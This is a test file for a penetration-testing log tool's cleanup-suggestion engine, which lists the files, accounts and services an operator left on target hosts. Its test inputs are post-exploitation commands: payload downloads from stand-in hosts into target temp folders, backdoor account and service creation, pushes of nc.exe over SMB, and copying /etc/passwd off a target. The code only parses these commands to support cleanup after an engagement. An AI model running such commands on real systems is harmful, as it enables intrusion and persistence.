import { describe, it, expect } from 'vitest';
import { suggestCleanup } from '../../../engines/cleanup';
import type { Host } from '../../../types/host';
import type { LogEntry } from '../../../types/log';
import type { CleanupItem } from '../../../types/cleanup';
import { transferMethods } from '../../../engines/generators/transfer';
import { BUILTIN_LIBRARY } from '../../../engines/library/data';
import { FIELD_MANUAL_CARDS } from '../../../engines/library/data/fieldManual';

const web = { id: 'web', name: 'web01', ip: '10.0.0.50' } as unknown as Host;
const dc = { id: 'dc', name: 'DC01', ip: '10.0.0.1' } as unknown as Host;
const hosts = [web, dc];

let n = 0;
function cmd(command: string, opts: { shell?: string; ranOn?: string | null; hostIds?: string[]; at?: number; id?: string } = {}): LogEntry {
  n += 1;
  return {
    id: opts.id ?? `e${n}`, engagementId: 'eng', kind: 'command', title: 't', titleEdited: false,
    ranOn: opts.ranOn ?? null, hostIds: opts.hostIds ?? [], observations: null, returnedNothing: false, private: false,
    content: { kind: 'command', blocks: [{ command, output: '', shell: opts.shell }] },
    at: opts.at ?? n, createdAt: 0, updatedAt: 0,
  };
}
const run = (command: string, opts: Parameters<typeof cmd>[1] = {}, known: CleanupItem[] = []) =>
  suggestCleanup([cmd(command, opts)], hosts, '', known).map(({ kind, target, hostId }) => ({ kind, target, hostId }));
const onWeb = { shell: 'www-data@web01:/tmp$' };
const onWin = { shell: 'PS C:\\> DC01' };

describe('target-side writes', () => {
  it('wget -O variants', () => {
    expect(run('wget http://x/a.sh -O /tmp/a.sh', onWeb)).toEqual([{ kind: 'file', target: '/tmp/a.sh', hostId: 'web' }]);
    expect(run('wget http://x/a.sh -O/tmp/b.sh', onWeb)[0].target).toBe('/tmp/b.sh');
    expect(run('wget http://x/a.sh --output-document=/tmp/c.sh', onWeb)[0].target).toBe('/tmp/c.sh');
    expect(run('wget http://x/a.sh -O -', onWeb)).toEqual([]);
  });
  it('curl -o / --output', () => {
    expect(run('curl http://x/a -o /tmp/a', onWeb)).toEqual([{ kind: 'file', target: '/tmp/a', hostId: 'web' }]);
    expect(run('curl http://x/a --output /tmp/b', onWeb)[0].target).toBe('/tmp/b');
    expect(run('curl http://x/a -o -', onWeb)).toEqual([]);
  });
  it('certutil urlcache', () => {
    expect(run('certutil -urlcache -split -f http://x/n.exe C:\\Temp\\n.exe', onWin)).toEqual([{ kind: 'file', target: 'C:\\Temp\\n.exe', hostId: 'dc' }]);
  });
  it('PowerShell OutFile incl. wget alias', () => {
    expect(run('iwr http://x/a -OutFile C:\\t\\a.exe', onWin)[0].target).toBe('C:\\t\\a.exe');
    expect(run('Invoke-WebRequest http://x/a -OutFile "C:\\my dir\\a.exe"', onWin)[0].target).toBe('C:\\my dir\\a.exe');
    expect(run('wget http://x/a -OutFile C:\\t\\w.exe', onWin)).toEqual([{ kind: 'file', target: 'C:\\t\\w.exe', hostId: 'dc' }]);
  });
  it('accounts', () => {
    expect(run('net user hax P@ss1 /add', onWin)).toEqual([{ kind: 'account', target: 'hax', hostId: 'dc' }]);
    expect(run('net user hax', onWin)).toEqual([]);
    expect(run('useradd -m -s /bin/bash bob', onWeb)).toEqual([{ kind: 'account', target: 'bob', hostId: 'web' }]);
    expect(run('adduser eve', onWeb)[0].target).toBe('eve');
    expect(run('useradd bob -s /bin/bash -G sudo', onWeb)[0].target).toBe('bob');
    expect(run('adduser --disabled-password --gecos "" bob', onWeb)[0].target).toBe('bob');
    expect(run('net user hacker P@ss /add /domain', onWin)[0].target).toBe('hacker');
  });
  it('services', () => {
    expect(run('sc create evil binPath= C:\\x.exe', onWin)).toEqual([{ kind: 'service', target: 'evil', hostId: 'dc' }]);
    expect(run('sc config svc binPath= C:\\x.exe', onWin)[0].target).toBe('svc');
    expect(run('New-Service -Name Foo -BinaryPathName C:\\x.exe', onWin)[0]).toEqual({ kind: 'service', target: 'Foo', hostId: 'dc' });
  });
  it('uses ranOn when shell names nothing', () => {
    expect(run('adduser eve', { ranOn: 'web01' })[0].hostId).toBe('web');
  });
});

describe('pushes from Kali', () => {
  it('scp remote destination', () => {
    expect(run('scp ./a.sh root@10.0.0.50:/tmp/a.sh')).toEqual([{ kind: 'file', target: '/tmp/a.sh', hostId: 'web' }]);
    expect(run('scp a.sh root@10.0.0.77:/tmp/a.sh', { hostIds: ['dc'] })[0].hostId).toBe('dc');
    expect(run('scp a.sh root@10.0.0.77:/tmp/a.sh')[0].hostId).toBeNull();
  });
  it('smbclient -c put', () => {
    expect(run("smbclient //10.0.0.1/C$ -U u -c 'put nc.exe Temp\\nc.exe'")).toEqual([{ kind: 'file', target: 'Temp\\nc.exe', hostId: 'dc' }]);
    expect(run("smbclient //10.0.0.1/C$ -c 'put /opt/nc.exe'")[0].target).toBe('nc.exe');
  });
  it('smbclient interactive put lines', () => {
    const r = run('smbclient //10.0.0.1/C$ -U u\nput a.txt b.txt\nls\nput /x/c.txt');
    expect(r.map((s) => s.target)).toEqual(['b.txt', 'c.txt']);
    expect(run('put a.txt')).toEqual([]);
  });
  it('upload in any block', () => {
    expect(run('upload /opt/n.exe C:\\Temp\\n.exe', { hostIds: ['dc'] })).toEqual([{ kind: 'file', target: 'C:\\Temp\\n.exe', hostId: 'dc' }]);
    expect(run('upload /opt/n.exe')[0].target).toBe('n.exe');
  });
});

describe('parsing', () => {
  it('quoted path keeps spaces', () => {
    expect(run("scp a root@10.0.0.50:'/tmp/my file'")[0].target).toBe('/tmp/my file');
  });
  it('chains, comments, blank lines, multi-line', () => {
    const r = run('# note\n\ncd /tmp && wget http://x/a -O a ; adduser z | cat\nwget http://x/b -O "q r"', onWeb);
    expect(r.map((s) => s.target)).toEqual(['a', 'z', 'q r']);
  });
  it('does not split inside quotes', () => {
    expect(run("echo 'a;b' && wget http://x/a -O 'x;y'", onWeb).map((s) => s.target)).toEqual(['x;y']);
  });
  it('duplicates collapse', () => {
    expect(run('wget http://x/a -O a\nwget http://x/a -O a', onWeb)).toHaveLength(1);
  });
  it('key is entry:kind:hash of the target, and case is not normalised', () => {
    const key = (command: string) => suggestCleanup([cmd(command, { ...onWin, id: 'E' })], hosts, '', [])[0].key;
    expect(key('net user Hax p /add')).toMatch(/^E:account:[0-9a-z]{1,16}$/);
    expect(key('net user Hax p /add')).toBe(key('net user Hax q /add'));
    expect(key('net user Hax p /add')).not.toBe(key('net user hax p /add'));
  });
  it('key survives a block edit that moves the command', () => {
    const e = cmd('adduser z', { ...onWeb, id: 'E' });
    const first = suggestCleanup([e], hosts, '', [])[0].key;
    const block = (e.content as { blocks: unknown[] }).blocks[0];
    const moved = { ...e, content: { ...e.content, blocks: [{ ...(block as object), command: 'id' }, block] } } as LogEntry;
    expect(suggestCleanup([moved], hosts, '', [])[0].key).toBe(first);
  });
  it('a very long target still has a key that fits and can be dismissed', () => {
    const target = `/tmp/${'a'.repeat(900)}`;
    const e = cmd(`wget http://x/a -O ${target}`, { ...onWeb, id: 'L' });
    const [s] = suggestCleanup([e], hosts, '', []);
    expect(s.target).toBe(target);
    expect(s.key.length).toBeLessThanOrEqual(500);
    const item = { id: 'i', engagementId: 'eng', hostId: null, kind: 'file', target: 'x', notes: null, sourceEntryId: null, suggestionKey: s.key, status: 'dismissed', removedAt: null, createdAt: 0, updatedAt: 0 } as CleanupItem;
    expect(suggestCleanup([e], hosts, '', [item])).toEqual([]);
  });
});

describe('guards', () => {
  it('a download on Kali is not suggested', () => {
    expect(run('wget http://x/linpeas.sh -O linpeas.sh')).toEqual([]);
    expect(run('wget http://x/linpeas.sh -O linpeas.sh', { shell: 'www-data@web01:/tmp$' })).toEqual([{ kind: 'file', target: 'linpeas.sh', hostId: 'web' }]);
  });
  it('scp from the target to Kali is not suggested', () => {
    expect(run('scp user@10.0.0.5:/etc/passwd .')).toEqual([]);
  });
  it('dismissed and added keys are filtered', () => {
    const e = cmd('wget http://x/1 -O a\nwget http://x/2 -O b\nwget http://x/3 -O c', { ...onWeb, id: 'K' });
    const item = (k: string, status: 'open' | 'dismissed'): CleanupItem => ({
      id: k, engagementId: 'eng', hostId: null, kind: 'file', target: k, notes: null, sourceEntryId: null,
      suggestionKey: k, status, removedAt: null, createdAt: 0, updatedAt: 0,
    });
    const keyOf = (t: string) => suggestCleanup([e], hosts, '', []).find((x) => x.target === t)!.key;
    const out = suggestCleanup([e], hosts, '', [item(keyOf('a'), 'dismissed'), item(keyOf('b'), 'open')]);
    expect(out.map((s) => s.target)).toEqual(['c']);
  });
  it('keys are stable', () => {
    const e = cmd('adduser z', onWeb);
    expect(suggestCleanup([e], hosts, '', []).map((s) => s.key)).toEqual(suggestCleanup([e], hosts, '', []).map((s) => s.key));
  });
  it('non-command entries are ignored and order is newest first', () => {
    const base = cmd('adduser x', onWeb);
    const others = (['note', 'screenshot', 'http', 'flag'] as const).map((k) => ({ ...base, id: k, kind: k, content: { kind: k, text: 'adduser x' } }) as unknown as LogEntry);
    expect(suggestCleanup(others, hosts, '', [])).toEqual([]);
    const old = cmd('adduser old', { ...onWeb, at: 1 });
    const recent = cmd('adduser new', { ...onWeb, at: 9 });
    expect(suggestCleanup([old, recent], hosts, '', []).map((s) => s.target)).toEqual(['new', 'old']);
  });
});

describe('fix round 1', () => {
  it('combined short flags', () => {
    expect(run('wget -qO /tmp/a http://x/a', onWeb)[0].target).toBe('/tmp/a');
    expect(run('wget -qO/tmp/a2 http://x/a', onWeb)[0].target).toBe('/tmp/a2');
    expect(run('wget -qO- http://x/a', onWeb)).toEqual([]);
    expect(run('curl -sSLo /tmp/c http://x/a', onWeb)[0].target).toBe('/tmp/c');
    expect(run('curl -sko /tmp/d http://x/a', onWeb)[0].target).toBe('/tmp/d');
    expect(run('curl -sSL http://x/a', onWeb)).toEqual([]);
  });
  it('stdout redirect of curl/wget in a target shell only', () => {
    expect(run('curl -s http://x/a > /tmp/r', onWeb)).toEqual([{ kind: 'file', target: '/tmp/r', hostId: 'web' }]);
    expect(run('curl -s http://x/a >> /tmp/r2', onWeb)[0].target).toBe('/tmp/r2');
    expect(run('curl -s http://x/a > /tmp/r')).toEqual([]);
    expect(run('whoami > out.txt', onWeb)).toEqual([]);
    expect(run('curl -s http://x/a 2>&1', onWeb)).toEqual([]);
  });
  it('directory destinations take the source basename', () => {
    expect(run('scp /opt/a.sh root@10.0.0.50:/tmp/')[0].target).toBe('/tmp/a.sh');
    expect(run('scp /opt/a.sh root@10.0.0.50:/tmp')[0].target).toBe('/tmp');
    expect(run('scp /opt/a.sh root@10.0.0.50:~')[0].target).toBe('~/a.sh');
    expect(run('scp /opt/a.sh root@10.0.0.50:.')[0].target).toBe('a.sh');
    expect(run("smbclient //10.0.0.1/C$ -c 'put /opt/nc.exe Temp\\'")[0].target).toBe('Temp\\nc.exe');
    expect(run('upload /opt/n.exe C:\\Temp\\', { hostIds: ['dc'] })[0].target).toBe('C:\\Temp\\n.exe');
  });
  it('adduser USER GROUP and net user /add first', () => {
    expect(run('adduser bob staff', onWeb)[0].target).toBe('bob');
    expect(run('useradd bob staff', onWeb)[0].target).toBe('staff');
    expect(run('net user /add hacker P@ss', onWin)[0].target).toBe('hacker');
  });
  it('push host falls back to an earlier line in the block', () => {
    expect(run('evil-winrm -i 10.0.0.1 -u a -p b\nupload /opt/n.exe')[0].hostId).toBe('dc');
    expect(run('evil-winrm -i 10.0.0.1 -u a -p b\nupload /opt/n.exe', { hostIds: ['web'] })[0].hostId).toBe('dc');
  });
  it('unwraps powershell and cmd', () => {
    expect(run('powershell -nop -c "iwr http://x/a -OutFile C:\\t\\a.exe"', onWin)[0].target).toBe('C:\\t\\a.exe');
    expect(run('cmd.exe /c certutil -urlcache -f http://x/n C:\\n.exe', onWin)[0].target).toBe('C:\\n.exe');
    expect(run("(New-Object Net.WebClient).DownloadFile('http://x/a','C:\\w\\a.exe')", onWin)).toEqual([{ kind: 'file', target: 'C:\\w\\a.exe', hostId: 'dc' }]);
    expect(run("(New-Object Net.WebClient).DownloadFile('http://x/a','C:\\w\\a.exe')")).toEqual([]);
  });
  it('unwraps a bare powershell -c / -Command', () => {
    expect(run('powershell -c "iwr http://x -OutFile C:\\a.exe"', onWin)[0].target).toBe('C:\\a.exe');
    expect(run('powershell.exe -Command "iwr http://x -OutFile C:\\a.exe"', onWin)[0].target).toBe('C:\\a.exe');
    expect(run('powershell -c "net user h P /add"', onWin)[0]).toMatchObject({ kind: 'account', target: 'h' });
  });
  it('a download to the null device is not suggested', () => {
    expect(run('curl -o /dev/null http://x', onWeb)).toEqual([]);
    expect(run('wget -O /dev/null http://x', onWeb)).toEqual([]);
    expect(run('iwr http://x -OutFile NUL', onWin)).toEqual([]);
    expect(run('iwr http://x -OutFile $null', onWin)).toEqual([]);
  });
  it('tolerates missing command/blocks and unbalanced quotes', () => {
    const e = cmd('x');
    const bad = { ...e, content: { kind: 'command', blocks: [{ output: '' }] } } as unknown as LogEntry;
    const none = { ...e, id: 'n', content: { kind: 'command' } } as unknown as LogEntry;
    expect(suggestCleanup([bad, none], hosts, '', [])).toEqual([]);
    expect(run('wget http://x -O "/tmp/uq', onWeb)[0].target).toBe('/tmp/uq');
  });
});


describe('transfer fetches', () => {
  it('bitsadmin, UNC copy and Start-BitsTransfer fetches are suggested for cleanup', () => {
    expect(run('bitsadmin /transfer job /download /priority normal http://10.10.14.9/a.exe C:\\Windows\\Temp\\a.exe', onWin))
      .toEqual([{ kind: 'file', target: 'C:\\Windows\\Temp\\a.exe', hostId: 'dc' }]);
    expect(run('copy \\\\10.10.14.9\\share\\a.exe C:\\Windows\\Temp\\a.exe', onWin)).toEqual([{ kind: 'file', target: 'C:\\Windows\\Temp\\a.exe', hostId: 'dc' }]);
    expect(run('xcopy \\\\10.10.14.9\\share\\a.exe C:\\Windows\\Temp\\ /y', onWin)[0].target).toBe('C:\\Windows\\Temp\\a.exe');
    expect(run('Start-BitsTransfer -Source http://10.10.14.9/a.exe -Destination C:\\Windows\\Temp\\a.exe', onWin))
      .toEqual([{ kind: 'file', target: 'C:\\Windows\\Temp\\a.exe', hostId: 'dc' }]);
    // A copy between local paths, or on Kali, leaves nothing to clean up.
    expect(run('copy C:\\a.txt C:\\b.txt', onWin)).toEqual([]);
    expect(run('copy \\\\10.10.14.9\\share\\a.exe C:\\Temp\\a.exe')).toEqual([]);
  });

  it('every generator method that writes to the target yields a cleanup suggestion when logged', () => {
    const IN_MEMORY = /DownloadString|\|\s*bash\b|^chmod\s/m;
    const cases = [
      { os: 'windows' as const, dir: 'C:\\Windows\\Temp', shell: onWin },
      { os: 'linux' as const, dir: '/tmp', shell: onWeb },
    ];
    let checked = 0;
    for (const { os, dir, shell } of cases) {
      for (const m of transferMethods(FIELD_MANUAL_CARDS, BUILTIN_LIBRARY, os)) {
        if (m.target.length === 0 || m.target.some((c) => IN_MEMORY.test(c.template))) continue;
        const text = m.target
          .map((c) => c.template.replaceAll('{LHOST}', '10.10.14.9').replaceAll('{FILE}', 'x.exe').replaceAll('{DEST_DIR}', dir).replaceAll('{PORT}', '8000').replaceAll('{BASE64_PAYLOAD}', 'AAAA'))
          .join('\n');
        const found = suggestCleanup([cmd(text, shell)], hosts, '', []);
        // The suggestion names the file this method put in the folder (Windows ftp: its script).
        const targets = found.map((f) => f.target);
        const want = os === 'windows' ? [`${dir}\\x.exe`, `${dir}\\ftp.txt`] : [`${dir}/x.exe`];
        expect(targets.some((t) => want.includes(t)), `${m.group} / ${m.label}: ${targets.join(', ')}`).toBe(true);
        checked++;
      }
    }
    expect(checked).toBeGreaterThanOrEqual(10);
  });
});
